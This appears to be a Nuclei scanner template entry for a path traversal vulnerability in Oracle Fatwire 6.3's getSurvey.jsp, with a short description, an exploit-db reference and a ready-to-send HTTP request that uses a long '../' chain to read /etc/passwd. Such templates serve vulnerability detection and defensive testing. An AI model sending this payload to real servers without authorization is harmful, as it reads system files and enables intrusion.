# Nuclei Template: Oracle Fatwire 6.3 - Path Traversal
**Template ID:** oracle-fatwire-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`oracle-fatwire-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/50167
